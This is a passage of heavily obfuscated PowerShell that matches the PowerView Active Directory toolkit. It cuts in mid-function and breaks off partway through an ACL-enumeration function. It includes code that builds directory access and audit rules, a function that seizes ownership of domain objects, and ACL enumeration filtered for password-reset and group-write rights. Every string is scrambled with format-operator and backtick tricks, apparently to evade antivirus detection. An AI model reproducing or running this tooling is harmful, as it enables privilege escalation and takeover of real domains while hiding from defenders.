        [ValidateSet({"{0}{1}"-f'B','ase'}, {"{2}{1}{0}"-f 'el','ev','OneL'}, {"{0}{1}"-f 'S','ubtree'})]
        [String]
        ${SE`ARChSc`ope} = ("{2}{1}{0}" -f 'e','re','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`esULtpa`GeSi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SErVERtI`Me`l`iMIt},

        [Switch]
        ${T`o`mBstoNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`e`D`ENTiAl} =   (&("{0}{1}{3}{2}" -f'gET','-v','lE','ARIaB') ("{0}{1}" -f 'jh3','xo6')  )."vAl`Ue"::"E`MptY",

        [Parameter(MAnDatorY = ${T`RuE})]
        [ValidateSet({"{0}{1}{2}{3}"-f'Acces','sSy','ste','mSecurity'}, {"{0}{1}{3}{2}"-f'C','re','d','ateChil'},{"{0}{1}{2}"-f'D','ele','te'},{"{0}{1}{2}" -f'DeleteCh','i','ld'},{"{2}{0}{1}" -f 'Tr','ee','Delete'},{"{0}{4}{2}{1}{3}"-f'E','g','endedRi','ht','xt'},{"{0}{2}{3}{1}"-f 'Gene','l','r','icAl'},{"{1}{2}{3}{0}" -f 'ecute','Ge','ner','icEx'},{"{1}{2}{3}{0}"-f'icRead','Gen','e','r'},{"{2}{0}{1}"-f'r','ite','GenericW'},{"{2}{1}{0}{3}" -f 'dre','l','ListChi','n'},{"{1}{2}{0}" -f'ct','ListObj','e'},{"{2}{0}{1}"-f'eadC','ontrol','R'},{"{0}{1}{2}{3}"-f 'Re','adPr','ope','rty'},{"{1}{0}"-f 'elf','S'},{"{2}{0}{1}"-f 'niz','e','Synchro'},{"{0}{2}{1}"-f'W','l','riteDac'},{"{2}{1}{0}" -f 'er','riteOwn','W'},{"{0}{2}{3}{1}"-f'Wr','ty','it','eProper'})]
        ${r`iGhT},

        [Parameter(MaNdaTORY = ${tR`Ue}, paRaMETeRsetnamE="aCC`Essrule`TYpE")]
        [ValidateSet({"{0}{1}"-f 'Al','low'}, {"{0}{1}"-f 'D','eny'})]
        [String[]]
        ${Ac`cEssc`oNTroLtY`pe},

        [Parameter(mandAToRy = ${TR`UE}, paRaMETErsetnaMe="Au`DiT`RU`letYpe")]
        [ValidateSet({"{1}{0}{2}" -f'ucc','S','ess'}, {"{1}{0}" -f'ailure','F'})]
        [String]
        ${a`UDit`FLAg},

        [Parameter(MANDatory = ${fAL`se}, paRAmeTerSEtname="ACc`ES`SR`UletyPE")]
        [Parameter(maNDATorY = ${FAl`SE}, pArameteRSetName="a`U`Di`TrulEtYPe")]
        [Parameter(MandaTOry = ${F`Alse}, paRAmEteRseTName="OBjEcT`g`UIDl`OO`KUp")]
        [Guid]
        ${obj`e`CtTy`pE},

        [ValidateSet('All', {"{1}{0}"-f 'dren','Chil'},{"{1}{0}{2}{3}"-f 'c','Des','endent','s'},{"{0}{1}" -f'N','one'},{"{4}{3}{0}{1}{2}"-f 'Ch','ild','ren','lfAnd','Se'})]
        [String]
        ${inHeri`Tan`CE`TYPE},

        [Guid]
        ${in`He`Rit`ed`Obj`ecTtYpE}
    )

    Begin {
        if (${pRi`NCi`Pa`LIdENti`Ty} -notmatch ("{0}{1}"-f '^S-','1-.*')) {
            ${Pri`Nc`IPA`lsEaRCH`eRarGUmen`TS} = @{
                ("{0}{2}{1}"-f 'I','tity','den') = ${PRIn`CiPAl`IdEnT`itY}
                ("{2}{0}{1}"-f 'rt','ies','Prope') = ("{4}{6}{0}{1}{5}{2}{3}" -f 'h','ednam','obje','ctsid','dis','e,','tinguis')
            }
            if (${PSBound`Pa`RAMet`ers}[("{1}{2}{3}{0}"-f'omain','Prin','cip','alD')]) { ${prinCi`P`A`l`seArche`RARgUme`NTs}[("{0}{1}" -f 'Dom','ain')] = ${pr`iNci`pal`do`maIn} }
            if (${psBOu`N`DpAra`m`EtERS}[("{1}{0}"-f 'rver','Se')]) { ${p`Rin`c`iPA`LSeAr`c`hE`R`ArgUMENtS}[("{0}{1}" -f'Ser','ver')] = ${se`RVEr} }
            if (${p`Sbou`Nd`Pa`RA`metErs}[("{1}{0}{2}" -f'op','SearchSc','e')]) { ${PRiNc`IPa`LS`eArc`herarg`UMEnts}[("{0}{1}{2}" -f'Se','a','rchScope')] = ${S`e`ArcHSC`OPe} }
            if (${PsbOu`NDpa`R`A`MEt`Ers}[("{3}{0}{4}{1}{2}" -f'sul','geSiz','e','Re','tPa')]) { ${prINcip`ALSe`ArcHErarG`U`m`EN`Ts}[("{2}{1}{0}"-f 'ultPageSize','s','Re')] = ${rEsu`lTpAg`eS`I`zE} }
            if (${pSBO`UNdP`ARa`meTeRs}[("{0}{1}{3}{4}{2}"-f'Se','rv','t','erTi','meLimi')]) { ${pRi`NCIp`ALs`eARcHERa`RgUM`eNTs}[("{0}{3}{2}{1}" -f'Serve','t','mi','rTimeLi')] = ${Se`RVErt`i`mELiM`it} }
            if (${pSBOUnDp`AramE`T`ERS}[("{1}{2}{0}" -f'bstone','T','om')]) { ${pRI`N`C`i`paLSE`ArCherargUM`ENTs}[("{1}{2}{3}{0}"-f'one','T','om','bst')] = ${tOmB`StO`NE} }
            if (${p`S`B`OU`NDpaR`AMETerS}[("{1}{2}{0}" -f 'ial','Cr','edent')]) { ${princIpAlseaRch`e`RArg`UmEN`TS}[("{1}{2}{0}{3}"-f'i','Creden','t','al')] = ${crEd`e`NtIaL} }
            ${P`RiNCI`Pal} = &("{2}{4}{3}{0}{1}"-f 'bje','ct','Get-Dom','O','ain') @PrincipalSearcherArguments
            if (-not ${PRi`Nc`iPal}) {
                throw ('U'+'nabl'+'e '+'to'+' '+'r'+'esolve '+'pr'+'inci'+'pal'+': '+"$PrincipalIdentity")
            }
            elseif(${pRIN`Cip`Al}."C`OUNt" -gt 1) {
                throw ("{1}{4}{6}{7}{2}{3}{8}{9}{10}{5}{0}" -f'd','PrincipalIdentit','mult','iple A','y m','e','atches',' ','D objects,',' b','ut only one is allow')
            }
            ${o`BJEcT`SId} = ${p`RiNci`paL}."ob`J`EctSID"
        }
        else {
            ${obj`E`cTSid} = ${P`RiNC`IP`ALI`dENT`ITY}
        }

        ${adrIG`ht} = 0
        foreach(${R} in ${Ri`gHt}) {
            ${Ad`RIGHT} = ${aDR`ig`HT} -bor (([System.DirectoryServices.ActiveDirectoryRights]${R})."VALUE`__")
        }
        ${A`dR`IgHT} = [System.DirectoryServices.ActiveDirectoryRights]${ADr`i`ghT}

        ${i`deNtI`Ty} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${o`BjEct`SId})
    }

    Process {
        if(${psCM`d`lET}.PARAMeTeRSEtnAME -eq ("{4}{1}{2}{0}{3}"-f'uleTyp','u','ditR','e','A')) {

            if(${objEc`TT`ype} -eq ${n`Ull} -and ${iNhERI`TA`N`CeTyPe} -eq  ( &("{2}{0}{1}"-f 'ARIAB','LE','v') ("{0}{1}" -f 'Dm','Oy'))."VAL`UE"::"E`MPTY" -and ${iNHERitEdoBjEC`TT`y`pe} -eq ${NU`Ll}) {
                &("{1}{0}{2}"-f 'ew-Ob','N','ject') ("{0}{3}{2}{11}{9}{7}{8}{12}{13}{1}{6}{5}{4}{10}" -f 'Sys','D','m.Direct','te','AuditR','y','irector','.','A','rvices','ule','orySe','c','tive') -ArgumentList ${iD`EN`TITy}, ${aD`R`iGHt}, ${auD`iTF`lag}
            } elseif(${oB`JE`cTtY`pE} -eq ${NU`ll} -and ${iNhERi`T`AN`Cet`yPe} -ne   (  &("{0}{2}{1}"-f'Ge','vARiaBle','t-')  ("{1}{0}" -f'Y','Dmo'))."v`AlUe"::"e`MpTY" -and ${InhErit`EDoBJ`ECT`Ty`pE} -eq ${n`ULL}) {
                &("{2}{1}{0}" -f 't','c','New-Obje') ("{0}{7}{1}{3}{8}{9}{5}{6}{2}{4}" -f'System.Direct','r','ryAuditRul','y','e','vices.ActiveDirect','o','o','S','er') -ArgumentList ${I`de`NTiTy}, ${a`dRIG`Ht}, ${Audit`F`lag}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${I`Nh`eRitA`NcEt`Ype})
            } elseif(${O`BJeCtT`ype} -eq ${N`ULL} -and ${in`hEr`I`TanCe`TYPE} -ne  (&("{0}{1}"-f 'I','tEM') ("{2}{1}{3}{0}" -f 'Dmoy','l','VARIAB','E:'))."VA`lue"::"EMP`TY" -and ${in`HEri`TEDo`BjectT`ypE} -ne ${nU`ll}) {
                &("{1}{2}{0}"-f 't','New','-Objec') ("{6}{5}{10}{8}{7}{2}{4}{1}{0}{3}{9}"-f'ryA','ecto','ervices.Ac','uditRu','tiveDir','stem.Dire','Sy','S','tory','le','c') -ArgumentList ${i`De`NtITy}, ${AdR`I`ghT}, ${AuD`I`T`FLAg}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${I`NHe`Rit`ANCety`PE}), ${INH`e`Rited`ob`Jec`T`TypE}
            } elseif(${oBJe`CTt`YPe} -ne ${nu`LL} -and ${INHErit`A`NCet`Ype} -eq  (&("{0}{1}{2}"-f'g','Et-Vari','able')  ('Dm'+'oy') -VaLu )::"eMp`Ty" -and ${in`hEr`iT`EDOBjE`CttYPe} -eq ${n`Ull}) {
                &("{0}{1}{2}"-f'N','ew-Ob','ject') ("{0}{2}{3}{7}{6}{5}{4}{1}" -f'S','e','ystem.DirectoryService','s','veDirectoryAuditRul','i','t','.Ac') -ArgumentList ${I`DE`Nti`TY}, ${AD`RI`ghT}, ${A`Ud`ITFlAg}, ${OBJe`CTt`Ype}
            } elseif(${ObjeC`Tty`Pe} -ne ${NU`Ll} -and ${iNh`e`RiTa`NcETyPe} -ne  ( &("{1}{2}{0}"-f 'ILditeM','Get-','ch')  ('VaRiA'+'bLe:'+'Dm'+'OY')  )."VaL`Ue"::"EMp`Ty" -and ${INHERiteDoB`JeC`Tty`pE} -eq ${N`Ull}) {
                &("{1}{0}{2}"-f'-Obj','New','ect') ("{3}{10}{12}{1}{13}{0}{6}{9}{2}{8}{5}{4}{11}{7}"-f 'ices.','ector','Di','Syst','o','ect','Activ','AuditRule','r','e','em.D','ry','ir','yServ') -ArgumentList ${IDEN`T`itY}, ${A`DRi`ght}, ${auDiTF`l`Ag}, ${O`BJE`ctTyPe}, ${INHeRIta`N`cEtY`Pe}
            } elseif(${o`B`jEctt`ypE} -ne ${Nu`Ll} -and ${iNH`e`R`ITaNc`ETyPE} -ne   ( &("{2}{0}{1}" -f'-IT','eM','GET') ("vArIA"+"BlE:"+"d"+"moY"))."vAL`UE"::"e`MPTy" -and ${INher`IT`ed`objectTy`pe} -ne ${n`Ull}) {
                &("{0}{1}{2}{3}" -f 'New-','Ob','jec','t') ("{8}{7}{4}{0}{2}{9}{11}{12}{3}{5}{10}{6}{1}"-f'ec','Rule','to','D','r','irec','ryAudit','i','System.D','ry','to','Service','s.Active') -ArgumentList ${iDEnt`iTY}, ${A`dR`ight}, ${a`UDi`TfLAg}, ${OBJE`C`TTypE}, ${i`NHeRitanCe`T`Y`pe}, ${inhERI`TE`do`B`JE`CttyPE}
            }

        }
        else {

            if(${Obj`e`ctT`yPE} -eq ${NU`LL} -and ${iNhERiT`A`N`cE`Type} -eq  ( &("{0}{3}{2}{1}"-f'gE','BlE','ria','T-vA') ("{0}{1}"-f 'D','Moy') -VAluE )::"eMp`TY" -and ${INhErITed`ob`JE`ctt`yPe} -eq ${N`UlL}) {
                &("{1}{0}{3}{2}" -f'ew','N','ect','-Obj') ("{4}{2}{1}{9}{6}{8}{0}{10}{7}{3}{5}" -f't','orySer','rect','essRul','System.Di','e','ces.','toryAcc','Ac','vi','iveDirec') -ArgumentList ${I`deNTIty}, ${a`driGHt}, ${A`cCESs`cOnTR`olt`yPE}
            } elseif(${O`BjEctt`yPe} -eq ${nu`ll} -and ${Inh`ErItAN`c`Et`ype} -ne   (&('LS')  ("{2}{0}{3}{1}"-f':DM','Y','VarIABLE','O')  )."VA`luE"::"em`PTy" -and ${INHe`RIte`DO`BJecT`TYPe} -eq ${nu`ll}) {
                &("{0}{2}{1}"-f 'Ne','ect','w-Obj') ("{4}{6}{1}{2}{8}{5}{3}{7}{0}"-f'e','ices.','Ac','ir','Syst','eD','em.DirectoryServ','ectoryAccessRul','tiv') -ArgumentList ${I`DeNtI`Ty}, ${a`dri`ght}, ${Acce`SS`cOn`T`ROltYpE}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${I`Nh`e`RiTancEType})
            } elseif(${Ob`JE`CtTYpE} -eq ${NU`LL} -and ${iNhe`RIt`An`cETYpE} -ne  ( &("{0}{2}{1}"-f 'get-vAri','E','ABL')  ("Dm"+"OY") )."v`AluE"::"em`PTy" -and ${InhErI`Te`d`oBjEcT`TYPe} -ne ${nU`LL}) {
                &("{1}{2}{0}" -f'ct','New-Ob','je') ("{6}{13}{2}{5}{14}{10}{7}{4}{1}{0}{12}{11}{3}{8}{9}" -f 'cti','s.A','Dir','ry','rvice','ec','Syst','rySe','Acc','essRule','o','cto','veDire','em.','t') -ArgumentList ${IdeNT`i`TY}, ${aDrIG`Ht}, ${AcCess`co`N`Tr`oLTypE}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${INhe`R`ITaNc`E`TypE}), ${I`NhEr`ITedObjE`CtTY`pE}
            } elseif(${O`BJ`EcTty`pe} -ne ${n`Ull} -and ${I`NH`ERiTAnceT`yPe} -eq  ( &("{2}{0}{1}" -f'bl','e','vARIA')  ("{0}{1}" -f 'dm','OY') )."V`AlUe"::"eMP`TY" -and ${iNHEr`ItE`dObJE`Ct`TYpE} -eq ${n`Ull}) {
                &("{2}{1}{0}"-f'ect','Obj','New-') ("{2}{1}{0}{5}{4}{10}{7}{3}{8}{6}{9}" -f'.','em','Syst','v','ryServices.Ac','Directo','ssRu','i','eDirectoryAcce','le','t') -ArgumentList ${i`dENti`Ty}, ${aDR`I`Ght}, ${ACCESSCOnt`R`olTY`PE}, ${oBj`eCTTy`pe}
            } elseif(${ObJ`e`CTt`YPe} -ne ${Nu`lL} -and ${I`Nhe`RitanCEtYPe} -ne   (  &("{1}{0}"-f 'R','dI') ("{1}{3}{2}{0}" -f 'oY','varIaBl','m','E:d')  )."Va`lUE"::"emp`TY" -and ${iNhERi`TEDo`BjEc`TtyPe} -eq ${Nu`ll}) {
                &("{2}{1}{0}"-f'ct','ew-Obje','N') ("{4}{6}{13}{7}{11}{5}{14}{0}{9}{12}{1}{2}{3}{8}{10}" -f 'ry','ry','A','ccess','S','ect','ys','e','Rul','Services.ActiveD','e','m.Dir','irecto','t','o') -ArgumentList ${Ide`NTI`TY}, ${ADri`G`HT}, ${A`CcessCOn`TrO`l`TYPe}, ${oB`JeCT`Type}, ${Inhe`R`itAn`C`etyPe}
            } elseif(${oBJE`CTTY`pe} -ne ${N`Ull} -and ${in`HE`R`ITanC`ETYpe} -ne  (  &("{3}{0}{1}{2}"-f 'ET-varI','A','BlE','G')  ("{0}{1}"-f 'dmO','Y') )."val`Ue"::"em`PtY" -and ${iNhe`RI`T`E`D`Ob`jECTTyPE} -ne ${NU`Ll}) {
                &("{2}{1}{0}"-f't','c','New-Obje') ("{2}{5}{10}{4}{3}{6}{8}{1}{11}{7}{9}{0}"-f 'le','o','Sy','ces','rvi','stem.','.ActiveDire','R','ct','u','DirectorySe','ryAccess') -ArgumentList ${I`DE`NTITY}, ${ad`R`IgHt}, ${AcC`EsScoNt`R`oLt`Y`pe}, ${o`BJect`TyPE}, ${InHERI`Tan`CetY`Pe}, ${iNHErit`eDObJ`E`CttYpE}
            }

        }
    }
}


function sET-`d`O`M`AiNobjeCtOwNEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{5}{8}{7}{0}{3}{9}{6}{1}{2}" -f 'tat','o','ns','eChanging','PSUs','eShoul','ti','cessForS','dPro','Func'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}"-f'S','PS','houldPro','cess'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POsiTIoN = 0, mAndATory = ${T`RuE}, VALUEFRoMpiPELInE = ${tr`Ue}, VaLUefROMpIpelINEBYPrOpERTYnamE = ${t`RuE})]
        [Alias({"{0}{2}{3}{1}"-f 'D','hedName','istingui','s'}, {"{2}{1}{0}{3}"-f'cco','A','Sam','untName'}, {"{1}{0}"-f 'e','Nam'})]
        [String]
        ${Id`ent`ITy},

        [Parameter(MandAtORY = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Owne','r'})]
        [String]
        ${OwNer`i`dENt`ITy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`m`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'r','Filte'})]
        [String]
        ${lDa`PFIl`TeR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'S','Path','AD'})]
        [String]
        ${se`ArchBa`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{5}{3}{1}{2}{4}{0}" -f 'ler','inCon','tro','ma','l','Do'})]
        [String]
        ${SeR`VER},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{1}{0}{2}" -f 'Le','One','vel'}, {"{1}{0}" -f'btree','Su'})]
        [String]
        ${Se`Archs`co`Pe} = ("{1}{0}"-f'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REsUl`T`pAGESiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Ser`Ve`RT`imeLimit},

        [Switch]
        ${tOMBS`T`ONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`eD`EntIaL} =   (  &("{0}{1}" -f 'di','r')  ("{3}{0}{1}{2}{4}" -f'rI','Able:','jh3XO','va','6') )."VaL`UE"::"EMp`Ty"
    )

    BEGIN {
        ${s`EaRche`Ra`RG`UmeNts} = @{}
        if (${P`SBO`U`NdPAr`Ame`TErS}[("{0}{1}"-f 'D','omain')]) { ${SE`A`RCh`era`RGu`meNts}[("{0}{1}" -f'Domai','n')] = ${d`OmAIN} }
        if (${PSb`OUn`DPaRAmEt`E`RS}[("{1}{0}{2}" -f 'A','LD','PFilter')]) { ${seARcHe`R`ARGum`E`NtS}[("{1}{2}{3}{0}" -f 'lter','LDA','P','Fi')] = ${ldAPfi`lt`Er} }
        if (${P`sBou`NDPAraMEt`ERS}[("{2}{0}{1}" -f 'ear','chBase','S')]) { ${SE`ArCh`eR`Ar`GuM`ENTS}[("{1}{2}{0}"-f'rchBase','S','ea')] = ${S`eArC`HbASe} }
        if (${p`s`BOU`NdPArAmETers}[("{0}{1}"-f'Ser','ver')]) { ${S`E`Ar`CHERa`RgUmEN`TS}[("{1}{0}"-f'r','Serve')] = ${SE`Rv`ER} }
        if (${psbO`U`NDPa`R`AM`ETers}[("{3}{0}{2}{1}"-f'arc','ope','hSc','Se')]) { ${s`eA`RcHEra`RgUmeNTS}[("{1}{0}{2}"-f 'hSco','Searc','pe')] = ${SEa`R`cHSc`oPe} }
        if (${P`SB`o`UNDpA`RaME`Ters}[("{2}{0}{1}" -f'ageSiz','e','ResultP')]) { ${sE`ARchERArG`U`ME`NtS}[("{1}{0}{3}{2}"-f 'esultPa','R','e','geSiz')] = ${r`Esu`lT`pAGESi`Ze} }
        if (${psb`Oun`DpArAMeTe`Rs}[("{4}{1}{0}{2}{3}" -f'm','rTimeLi','i','t','Serve')]) { ${SeARcHe`RARg`U`MenTS}[("{0}{2}{3}{1}"-f 'Se','meLimit','rverT','i')] = ${SE`RVERtIm`ELi`MIT} }
        if (${PsBOUnD`PARaM`e`TErS}[("{1}{2}{0}"-f'ne','T','ombsto')]) { ${s`eAR`ch`ErARG`UMenTs}[("{2}{1}{3}{0}"-f'tone','om','T','bs')] = ${To`MbSt`OnE} }
        if (${P`sb`oU`NDp`ARAmeteRs}[("{1}{2}{0}" -f'dential','C','re')]) { ${SEarCH`ErAr`GuME`NTs}[("{2}{1}{0}" -f 'ial','ent','Cred')] = ${credENT`I`AL} }

        ${oWN`ERS`id} = &("{3}{0}{2}{1}"-f 'e','-DomainObject','t','G') @SearcherArguments -Identity ${OwNeride`N`Ti`TY} -Properties ("{1}{2}{3}{0}"-f 'd','ob','je','ctsi') | &("{0}{1}{2}"-f'Select-O','b','ject') -ExpandProperty ("{1}{0}{2}" -f'ect','obj','sid')
        if (${OW`NERS`id}) {
            ${OwnEri`dEnT`I`TyREFEr`enCE} = [System.Security.Principal.SecurityIdentifier]${ow`NeRS`ID}
        }
        else {
            &("{1}{2}{4}{0}{3}" -f'n','Wri','t','g','e-Warni') ('[Set-'+'Domai'+'nObjectOw'+'ner'+'] '+'Err'+'o'+'r '+'pa'+'rsin'+'g '+'ow'+'ne'+'r '+'id'+'entity'+' '+"'$OwnerIdentity'")
        }
    }

    PROCESS {
        if (${owN`erId`en`T`iTYRefEREncE}) {
            ${S`EarchE`RArguME`NTs}['Raw'] = ${tr`Ue}
            ${seARch`eR`ARG`U`MEN`Ts}[("{0}{1}{2}" -f'Id','en','tity')] = ${IDEn`Tity}

            
            ${r`A`w`oBjEct} = &("{1}{0}{2}" -f'-','Get','DomainObject') @SearcherArguments

            ForEach (${OB`JE`CT} in ${rA`wOb`jeCT}) {
                try {
                    &("{1}{2}{0}{3}" -f'rbo','Wri','te-Ve','se') ('[Se'+'t-DomainObj'+'e'+'c'+'t'+'Own'+'er] '+'At'+'te'+'mpti'+'ng '+'to'+' '+'set'+' '+'t'+'he '+'ow'+'ner '+'fo'+'r '+"'$Identity' "+'t'+'o '+"'$OwnerIdentity'")
                    ${EnT`Ry} = ${RAwO`B`JeCT}.("{0}{3}{2}{4}{5}{1}"-f'Ge','y','tory','tDirec','En','tr').Invoke()
                    ${E`NT`RY}."P`sBASe"."OP`TiO`NS"."S`eCuRi`TY`Masks" = ("{1}{0}"-f'wner','O')
                    ${E`NTry}."ps`B`ASe"."O`BJe`cT`sEcU`RItY".("{0}{1}" -f'Set','Owner').Invoke(${ow`N`ErI`de`NTItY`REfe`ReNce})
                    ${E`NTrY}."P`SB`Ase".("{3}{1}{0}{2}"-f'ng','a','es','CommitCh').Invoke()
                }
                catch {
                    &("{1}{4}{3}{2}{0}" -f'g','W','n','te-Warni','ri') ('[Set-Dom'+'ainO'+'bject'+'Own'+'er] '+'Erro'+'r '+'s'+'etting'+' '+'ow'+'ne'+'r: '+"$_")
                }
            }
        }
    }
}


function ge`T-do`MAinOBj`ECt`AcL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}"-f'dPro','PSShoul','ss','ce'}, '')]
    [OutputType({"{2}{1}{0}" -f 'w.ACL','Vie','Power'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOsitIOn = 0, vAluEFROmPipeLINe = ${T`Rue}, vAluEfrOmpIpelinEByPrOPeRtyNAMe = ${t`Rue})]
        [Alias({"{3}{1}{0}{2}"-f 'i','gu','shedName','Distin'}, {"{0}{1}{2}" -f'S','am','AccountName'}, {"{1}{0}" -f'me','Na'})]
        [String[]]
        ${idenT`itY},

        [Switch]
        ${sa`cL},

        [Switch]
        ${rESO`lvEgu`idS},

        [String]
        [Alias({"{1}{0}"-f 'ights','R'})]
        [ValidateSet('All', {"{2}{0}{1}"-f 'setPass','word','Re'}, {"{0}{1}{3}{2}" -f'Writ','eMem','rs','be'})]
        ${rig`h`Ts`FIl`TeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doM`A`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'lter','F','i'})]
        [String]
        ${l`dap`FIlTEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'h','ADSPat'})]
        [String]
        ${sE`Arc`h`Base},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{0}{4}" -f 'e','Controll','ain','Dom','r'})]
        [String]
        ${SERv`eR},

        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{2}{1}{0}" -f'el','ev','OneL'}, {"{1}{0}"-f 'tree','Sub'})]
        [String]
        ${sE`ARc`HsCO`pe} = ("{1}{0}" -f 'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`SulTpAGE`si`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRve`Rti`meLIM`IT},

        [Switch]
        ${tOMB`St`one},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`edenTI`AL} =  ${J`h3`Xo6}::"emp`TY"
    )

    BEGIN {
        ${s`EAr`C`HeRaRgumentS} = @{
            ("{2}{1}{0}" -f 'es','i','Propert') = ("{9}{10}{12}{8}{5}{3}{6}{13}{7}{2}{11}{0}{1}{4}"-f',o','b','shed','ri','jectsid','tydesc','pt','ui','ri','samaccou','ntname,nts','name','ecu','or,disting')
        }

        if (${pSBOUN`D`pA`Ra`meTers}[("{1}{0}" -f'l','Sac')]) {
            ${sEA`RChE`RaR`GU`MeN`Ts}[("{0}{3}{1}{2}" -f'S','curityMask','s','e')] = ("{1}{0}"-f 'l','Sac')
        }
        else {
            ${sea`RcH`erAR`g`UmENts}[("{1}{2}{0}"-f'ks','Secu','rityMas')] = ("{0}{1}"-f 'D','acl')
        }
        if (${PS`BoUnDpARAME`TE`RS}[("{2}{1}{0}" -f'in','oma','D')]) { ${searC`heraR`G`UME`Nts}[("{0}{1}"-f 'D','omain')] = ${D`oMA`IN} }
        if (${PSbo`Un`DPaRam`ETE`Rs}[("{0}{1}{2}" -f 'Se','arc','hBase')]) { ${s`EArcH`eRARgUM`e`N`TS}[("{0}{2}{1}" -f 'SearchB','se','a')] = ${SEarc`H`BAsE} }
        if (${PS`BO`UNDPA`RaME`TERs}[("{2}{0}{1}"-f 'rve','r','Se')]) { ${SEar`c`heRARg`UmeN`Ts}[("{0}{1}" -f 'S','erver')] = ${sErV`eR} }
        if (${p`sBOunD`Pa`R`A`MeTERS}[("{1}{0}{3}{2}" -f'rch','Sea','e','Scop')]) { ${Sear`c`HeRa`RguMeNTS}[("{0}{1}{2}"-f 'SearchS','co','pe')] = ${SE`ARc`hSCOPE} }
        if (${PsboUnDP`A`RAmEt`E`Rs}[("{4}{0}{2}{3}{1}"-f 'ul','Size','tPa','ge','Res')]) { ${SearCheRaR`Gu`M`E`NtS}[("{2}{4}{0}{3}{1}"-f't','ageSize','Resu','P','l')] = ${Resu`LTPa`GeS`iZe} }
        if (${P`S`BOuN`DParA`MeTERS}[("{2}{1}{0}"-f 'imit','rTimeL','Serve')]) { ${sEa`Rch`e`RArGUmE`N`Ts}[("{1}{0}{2}" -f'verTim','Ser','eLimit')] = ${SER`V`ERt`Ime`liMit} }
        if (${PSBOUndPa`R`AM`eterS}[("{1}{2}{0}"-f 'e','Tombst','on')]) { ${S`eA`RchE`RArG`UmEnTS}[("{1}{0}{2}"-f'm','To','bstone')] = ${to`mbsto`Ne} }
        if (${Ps`B`OundP`AramETE`Rs}[("{0}{1}{2}{3}"-f 'Cr','e','de','ntial')]) { ${S`EArc`heRARg`U`MenTs}[("{2}{3}{0}{1}"-f 'tia','l','Cre','den')] = ${crEDE`NtI`AL} }
        ${SEA`R`cheR} = &("{3}{1}{0}{4}{2}" -f 'mainSea','t-Do','r','Ge','rche') @SearcherArguments

        ${Do`MaingU`I`DmaPargu`ME`Nts} = @{}
        if (${PSBO`UND`p`ARam`eT`ers}[("{0}{1}" -f'Dom','ain')]) { ${doM`Ain`GUiD`mapaRgu`m`eN`Ts}[("{0}{1}" -f 'Do','main')] = ${d`Om`AIN} }
        if (${P`sb`O`UNDpAra`meteRs}[("{0}{1}"-f 'Se','rver')]) { ${D`OMa`in`gui`dmapa`Rg`U`MENts}[("{0}{1}" -f 'Serve','r')] = ${Ser`V`er} }
        if (${psb`OUN`DPArAME`TE`Rs}[("{3}{2}{4}{1}{0}"-f 'ize','geS','ult','Res','Pa')]) { ${d`OmaiNGUiDm`ApArG`U`me`N`Ts}[("{0}{1}{2}" -f 'ResultP','ageSi','ze')] = ${rES`ULt`paG`eSIzE} }
        if (${psbOu`ND`P`A`RamET`eRS}[("{0}{2}{1}{3}"-f'Serv','Ti','er','meLimit')]) { ${dO`mAINGU`idmapaR`G`UM`E`NTs}[("{3}{2}{1}{0}" -f'meLimit','rTi','ve','Ser')] = ${sER`V`ERT`I`MELimIT} }
        if (${psbOUnDp`AR`AM`ET`E`RS}[("{2}{0}{1}"-f'redenti','al','C')]) { ${d`OMa`In`GUID`ma`p`ARGumeNts}[("{2}{3}{0}{1}" -f 'den','tial','Cr','e')] = ${CR`ED`enti`AL} }

        
        if (${pSb`OU`NdpARa`M`EteRS}[("{2}{0}{1}" -f 'D','s','ResolveGUI')]) {
            ${GuI`DS} = &("{4}{3}{1}{2}{0}" -f'ap','I','DM','ainGU','Get-Dom') @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (${sear`c`Her}) {
            ${id`E`NtITYf`IlTer} = ''
            ${fi`LT`Er} = ''
            ${i`D`EnTItY} | &("{3}{0}{1}{2}"-f 'e-Ob','j','ect','Wher') {${_}} | &("{0}{1}{2}{3}"-f'F','orE','ach-O','bject') {
                ${id`ENTITyI`N`S`TANce} = ${_}.("{1}{0}"-f 'place','Re').Invoke('(', '\28').("{0}{2}{1}" -f'Re','ace','pl').Invoke(')', '\29')
                if (${i`dEN`TiTYIN`ST`An`cE} -match ("{2}{0}{1}"-f '-1-','.*','^S')) {
                    ${IDeNTiT`Yf`IL`TeR} += "(objectsid=$IdentityInstance)"
                }
